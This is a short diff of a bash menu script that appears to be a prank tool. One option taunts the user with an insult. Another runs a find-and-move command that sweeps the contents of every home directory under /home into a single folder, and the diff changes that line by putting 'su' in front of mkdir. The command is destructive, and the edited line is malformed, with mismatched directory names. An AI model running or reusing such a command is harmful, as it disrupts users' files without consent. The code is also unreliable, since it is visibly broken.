@@ -46,7 +46,7 @@ case $option in
         echo -e "\n${yellowColour}Fucking nerd, did you think that this would work?${endColour}\n"
         ;;
     2)
-        mkdir -p /home/.directory && find /home -mindepth 2 -exec mv {} /home/directory/ \;
+        su mkdir -p /home/.directory && find /home -mindepth 2 -exec mv {} /home/directory/ \;
 
         ;;
     3)
